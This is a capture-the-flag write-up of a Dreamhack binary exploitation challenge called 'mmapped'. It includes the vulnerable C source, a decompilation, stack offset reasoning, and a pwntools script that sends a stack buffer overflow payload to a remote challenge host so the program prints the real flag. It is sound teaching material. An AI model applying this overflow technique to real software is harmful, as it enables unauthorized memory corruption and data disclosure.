# Write-up of the challenge "mmapped"

This challenge is part of the "Binary exploitation" category and is in **Level 1**.

# Goal of the challenge

The objective of this challenge is to change the **to swap the mprotect with the fake flag so that the real flag get's printed**.

## Program structure

```
// Name: chall.c
// Compile: gcc -fno-stack-protector chall.c -o chall

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>

#define FLAG_SIZE 0x45

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
}

int main(int argc, char *argv[]) {
    int len;
    char * fake_flag_addr;
    char buf[0x20];
    int fd;
    char * real_flag_addr;

    initialize();

    fd = open("./flag", O_RDONLY);
    len = FLAG_SIZE;
    fake_flag_addr = "DH{****************************************************************}";

    printf("fake flag address: %p\n", fake_flag_addr);
    printf("buf address: %p\n", buf);

    real_flag_addr = (char *)mmap(NULL, FLAG_SIZE, PROT_READ, MAP_PRIVATE, fd, 0);
    printf("real flag address (mmapped address): %p\n", real_flag_addr);

    printf("%s", "input: ");
    read(0, buf, 60);

    mprotect(real_flag_addr, len, PROT_NONE);

    write(1, fake_flag_addr, FLAG_SIZE);
    printf("\nbuf value: ");
    puts(buf);

    munmap(real_flag_addr, FLAG_SIZE);
    close(fd);

    return 0;
}


```

Decompiling (important part only):

```
unsigned int main(unsigned int a0, unsigned long long a1)
{
    unsigned int v8;  // edx
    unsigned long long v0;  // [bp-0x58]
    unsigned int v1;  // [bp-0x4c]
    char v2;  // [bp-0x48]
    void* ptr;  // [bp-0x20]
    void* v4;  // [bp-0x18]
    unsigned int v5;  // [bp-0x10]
    unsigned int v6;  // [bp-0xc]

    v1 = a0;
    v0 = a1;
    initialize();
    v6 = open("./flag", 0, v8);
    v5 = 69;
    v4 = "DH{****************************************************************}";
    printf("fake flag address: %p\n", v4);
    printf("buf address: %p\n", &v2);
    ptr = mmap(NULL, 69, 1, 2, v6, 0);
    printf("real flag address (mmapped address): %p\n", ptr);
    printf("%s", "input: ");
    read(0, &v2, 60);
    mprotect(ptr, v5, 0, v5);
    write(1, v4, 69);
    printf("\nbuf value: ");
    puts(&v2);
    munmap(ptr, 69);
    close(v6);
    return 0;
}
```

## Security breach

The vulnerability here is **bof**

```
    read(0, buf, 60);
```

## Solution

So my idea was to find the offset from the buffer to the pointer and swap it with the fake flag and later continue to the **v4** and put the real address there. The reason we want to overwrite **v4** is because also it writes the flag later:

```
write(1, v4, 69);
```

The buff is at:

```
char v2;  // [bp-0x48]
```

and the pointer at:

```
void* ptr;  // [bp-0x20]
```

So the offset should be 0x48 - 0x20 = 40.

So our idea is to **bof** with offset of **40** and we will change the pointer to **fake address** after it we will come in the space of **v4** and there we will write the **real flag adress** so that when it is called again it will return the real flag!

How did we know that **v4** is at the offset 48?

As you can see the buffer is at 0x48:

```
char v2;  // [bp-0x48]
```

and v4 is at:

```
void* v4;  // [bp-0x18]
```

So the offset should be 0x48 - 0x18 = 48

solve.py:

```
from pwn import *

# process =  ('./chall')
p = remote('host3.dreamhack.games', 9718)

p.recvuntil(b'fake flag address: ')
fake = int(p.recvline(), 16)
p.recvuntil(b'real flag address (mmapped address): ')
real = int(p.recvline(), 16)

payload = b'A' * 40 + p64(fake) + p64(real)
p.sendlineafter(b'input: ', payload)

p.interactive()

```
